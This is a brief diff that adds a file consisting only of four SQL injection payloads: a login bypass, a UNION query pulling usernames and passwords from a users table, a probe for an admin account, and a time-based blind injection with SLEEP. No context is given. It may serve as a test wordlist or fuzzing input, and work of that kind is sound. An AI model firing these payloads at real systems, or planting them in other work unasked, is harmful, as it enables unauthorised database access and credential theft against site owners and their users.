@@ -1,0 +1,10 @@
+' OR '1'='1' --
+
+' UNION SELECT username, password FROM users --
+
+
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
+
+
+' OR IF(1=1, SLEEP(5), 0) --
+
